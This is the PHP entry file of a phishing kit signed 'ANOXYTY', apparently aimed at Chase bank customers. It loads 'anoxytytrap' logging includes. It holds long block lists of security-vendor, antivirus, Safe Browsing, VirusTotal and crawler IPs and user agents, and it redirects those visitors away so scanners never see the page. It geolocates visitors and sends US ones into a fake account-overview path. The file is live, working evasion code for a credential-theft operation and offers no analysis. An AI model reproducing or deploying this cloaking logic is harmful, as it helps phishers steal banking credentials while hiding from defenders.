<?php
@error_reporting(0);


/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/

ini_set( "display_errors", 0); 
require_once 'anoxytytrap/logger.php';
include 'anoxytytrap/bite.php';
include 'anoxytytrap/country.php';
   $banned_ip_addresses = array('54.68.','64.79.100.23','5.254.97.75','148.251.236.167','88.180.102.124','62.210.172.77','195.206.253.146','164.132.145.','164.132.146.','164.132.147.','164.132.148.','164.132.149.','51.38.247.56','51.38.247.56','51.38.248.','51.38.249.','51.38.250.','51.38.251.','51.38.252.239','35.180.','35.181.','66.102.8.','208.87.237.','205.251.148.','45.89.174.','95.49.231.','80.82.64.','34.70.','34.71.','34.72.','34.73.','34.74.','34.75.','52.250.','52.251.','90.187.238.157','69.25.56.','69.25.57.','69.25.58.','69.25.59.','107.152.186.','38.145.83.','159.89.','209.17.96.','209.17.97.','5.62.41.','192.99.56.','208.87.237.','159.65.210.','198.54.128.146','150.143.151.239','66.101.','66.102.','35.187.132.','204.13.200.','204.13.201.','181.214.182.','104.227.178.','191.101.73.34','45.40.','85.203.46.','54.221.','13.54.'.'13.55.','40.118.128.','40.118.230.40','88.104.','127.0.0.','88.105.','88.106.','88.107.','88.108.','88.109.','88.110.','88.111.','159.242.234.','206.216.','206.217.','80.117.36.234','45.154.35.236','198.12.116.203','165.73.248.93','143.244.','93.119.224.','93.119.225.','93.119.226.','93.119.227.','150.136.','150.137.','161.35.89.202');
   $banned_bots = array('.ru','AhrefsBot','crawl','crawler','DotBot','linkdex','majestic','meanpath','PageAnalyzer','robot','rogerbot','semalt','SeznamBot','spider','Google','MSN','bing','Slurp','Yahoo','DuckDuck','Googlebot','bot','Bot','Amazonaws','Amazon','amazon','Google','safebrowsing','googlesafebrowing','Fortiguard','Baiduspider','ia_archiver','NetcraftSurveyAgent','Sogouwebspider','bingbot','Yahoo!Slurp','facebookexternalhit','PrintfulBot','msnbot','Twitterbot','UnwindFetchor','urlresolver','Butterfly','TweetmemeBot','PaperLiBot','MJ12bot','AhrefsBot','MicrosoftCorporation','Exabot','Ezooms','YandexBot','SearchmetricsBot','picsearch','TweetedTimesBot','QuerySeekerSpider','ShowyouBot','woriobot','merlinkbot','BazQuxBot','Kraken','SISTRIXCrawler','R6_CommentReader','magpie-crawler','GrapeshotCrawler','PercolateCrawler','MaxPointCrawler','R6_FeedFetcher','NetSeercrawler','grokkit-crawler','SMXCrawler','PulseCrawler','Y!J-BRW','80legs.com/webcrawler','Mediapartners-Google','Spinn3r','InAGist','Python-urllib','NING','TencentTraveler','Feedfetcher-Google','mon.itor.us','spbot','Feedly','bitlybot','ADmantXPlatform','Niki-Bot','feedfetcher','BitDefender','mcafee','antivirus','cloudflare','p3pwgdsn','avg','avira','avast','ovh.net','security','twitter','bitdefender','virustotal','phising','clamav','baidu','safebrowsing','eset','mailshell','azure','miniature','tlh.ro','aruba','dyn.plus.net','pagepeeker','SPRO-NET-207-70-0','SPRO-NET-209-19-128','vultr','colocrossing.com','geosr','drweb','dr.web','linode.com','opendns','cymru.com','sl-reverse.com','surriel.com','hosting','orange-labs','speedtravel','metauri','apple.com','bruuk.sk','sysms.net','oracle','cisco','amuri.net','versanet.de','hilfe-veripayed.com','googlebot.com','upcloud.host','nodemeter.net','e-active.nl','downnotifier','online-domain-tools','fetcher6-2.go.mail.ru','uptimerobot.com','monitis.com','colocrossing.com','majestic12','as9105.com','btcentralplus.com','anonymizing-proxy','digitalcourage.de','triolan.net','staircaseirony','stelkom.net','comrise.ru','kyivstar.net','mpdedicated.com','starnet.md','bc.googleusercontent.com','progtech.ru','hinet.net','is74.ru','shore.net','cyberinfo','ipredator','unknown.telecom.gomel.by','minsktelecom.by','parked.factioninc.com','compute.amazonaws.com','google-proxy','rdns.cloudsystemnetworks.com','ff.avast.com','mailcontrol.com','tor-exit-anonymizer.appliedprivacy.net','dandify.homeconsolidate.com');
   $banned_unknown_bots = array('bot ','bot_','bot+','bot:','bot,','bot;','bot\\','bot.','bot/','bot-');
   $good_bots = array('smile');
   $banned_redirect_url = 'http://english-1329329990.spampoison.com';

// Visitor's IP address and Browser (User Agent)
   $ip_address = $_SERVER['REMOTE_ADDR'];
   $browser = $_SERVER['HTTP_USER_AGENT'];

// Declared Temporary Variables
   $ipfound = $piece = $botfound = $gbotfound = $ubotfound = '';

// Checks for Banned IP Addresses and Bots
   if($banned_redirect_url != ''){
     // Checks for Banned IP Address
        if(!empty($banned_ip_addresses)){
          if(in_array($ip_address, $banned_ip_addresses)){$ipfound = 'found';}
          if($ipfound != 'found'){
            $ip_pieces = explode('.', $ip_address);
            foreach ($ip_pieces as $value){
              $piece = $piece.$value.'.';
              if(in_array($piece, $banned_ip_addresses)){$ipfound = 'found'; break;}
            }
          }
          if($ipfound == 'found'){header("location: $banned_redirect_url"); exit();}
        }

     // Checks for Banned Bots
        if(!empty($banned_bots)){
          foreach ($banned_bots as $bbvalue){
            $pos1 = stripos($browser, $bbvalue);
            if($pos1 !== false){$botfound = 'found'; break;}
          }
          if($botfound == 'found'){header("location: $banned_redirect_url"); exit();}
        }

     // Checks for Banned Unknown Bots
        if(!empty($good_bots)){
          foreach ($good_bots as $gbvalue){
            $pos2 = stripos($browser, $gbvalue);
            if($pos2 !== false){$gbotfound = 'found'; break;}
          }
        }
        if($gbotfound != 'found'){
          if(!empty($banned_unknown_bots)){
            foreach ($banned_unknown_bots as $bubvalue){
              $pos3 = stripos($browser, $bubvalue);
              if($pos3 !== false){$ubotfound = 'found'; break;}
            }
            if($ubotfound == 'found'){header("location: $banned_redirect_url"); exit();}
          }
        }
   }

$ip = getenv("REMOTE_ADDR");

$url = "http://www.geoplugin.net/json.gp?ip=".$ip;
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$resp=curl_exec($ch);
curl_close($ch);
$details = json_decode($resp, true);
$countrycode = $details['geoplugin_countryCode']; 	  
 
if($countrycode=='US')
    header( 'Location: overview?xgcfhdty/ythdchvj/auth/overviewAccounts/index' ) ;
else 
    header( 'Location: https://www.error.com/search?client=firefox-b-d&q=chase' ) ;
?>